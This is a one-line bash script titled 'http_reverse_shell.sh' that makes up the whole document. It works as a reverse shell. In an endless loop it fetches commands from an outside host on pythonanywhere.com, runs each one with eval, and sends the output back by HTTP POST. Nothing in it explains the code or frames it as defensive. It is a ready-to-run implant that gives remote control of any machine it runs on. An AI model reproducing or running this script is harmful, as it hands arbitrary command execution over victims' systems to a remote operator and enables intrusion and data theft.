#!/bin/bash
# http_reverse_shell.sh

while :;do c=$(curl -s blackarrow.pythonanywhere.com/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s blackarrow.pythonanywhere.com/http_reverse_shell/ --data-urlencode "stdout=$(eval $c)";sleep 3;done
